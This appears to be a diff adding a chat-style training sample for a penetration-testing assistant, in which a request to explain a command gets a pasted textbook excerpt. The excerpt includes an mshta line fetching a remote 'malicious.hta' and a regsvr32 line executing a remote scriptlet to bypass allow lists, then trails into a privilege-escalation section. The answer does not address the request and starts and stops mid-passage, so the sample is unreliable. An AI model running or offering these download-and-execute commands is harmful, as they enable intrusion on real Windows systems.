@@ -1,0 +1,25 @@
+system
+You are a cybersecurity and penetration testing expert inside a live operator console.
+user
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+mshta.exe https://h4cker.org/malicious.hta
+Regsvr32 is a command-line utility for registering and unregistering OLE
+controls, such as DLLs and ActiveX controls. It can be used to execute
+DLLs remotely, bypassing allow list mechanisms:
+regsvr32.exe /s /n /u /i:http://example.com/malicious
+There are dozens of other examples at the LOLBAS website.
+Post-Exploitation Privilege Escalation
+Privilege escalation is the act of gaining access to resources that normally
+would be protected from an application or a user. The result is that a user
+can gain additional privileges beyond those that were originally intended by
+the developer of the application.
+There are two general types of privilege escalation:
+• Vertical Privilege Escalation: With vertical privilege escalation, as
+illustrated in Figure 6-11, a lower-privileged user accesses functions
+reserved for higher-privileged users (such as root or administrator access).
